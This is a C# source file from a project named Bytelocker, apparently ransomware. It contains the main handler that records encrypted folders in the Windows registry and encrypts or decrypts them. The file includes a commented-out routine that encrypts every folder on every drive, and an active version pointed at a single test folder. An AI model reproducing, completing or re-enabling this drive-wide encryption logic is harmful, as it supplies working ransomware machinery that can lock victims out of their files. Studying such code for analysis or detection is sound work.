using System;
using System.Collections.Generic;
using System.IO;

namespace Bytelocker.CryptoManager
{
    class CryptoManagerMainHandler
    {
        private RegistryManager rm;

        public CryptoManagerMainHandler()
        {
            this.rm = new RegistryManager();
            this.rm.CreateMainKey();
            this.rm.CreateSubKey(RegistryManager.FOLDER_KEY_NAME);
        }

        public void DecryptSingleFile(String file)
        {
            FileManager fm = new FileManager();
            fm.ChooseFile(file);
            fm.SetupFileEncrypter();
            fm.DecryptFile();
        }

        public void DecryptAll()
        {
            RegistryManager rm = new RegistryManager();
            DirManager dfm = new DirManager();

            List<String> dirs = rm.ReadAllValues(RegistryManager.FOLDER_KEY_NAME);

            foreach (String subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.DecryptDir();
            }
        }
        /*
        public void EncryptAll()
        {
            DirManager dfm = new DirManager();

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                List<String> dirs = DirManager.GetFoldersRecursive(drive.ToString());
                foreach (String subDir in dirs)
                {
                    dfm.ChooseDir(subDir);
                    dfm.EncryptDir();
                }
            }
        }
        */

        public void EncryptAll()
        {
            DirManager dfm = new DirManager();
            List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Desktop\New folder");
            foreach (String subDir in dirs)
                {
                dfm.ChooseDir(subDir);
                dfm.EncryptDir();
                }
        }

        public List<String> FilesEncryptedList()
        {
            try
            {
                return new List<String>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
            } catch (Exception)
            {
                // if the key does not exist return empty list
                return new List<String>();
            }
            
        }
    }
}
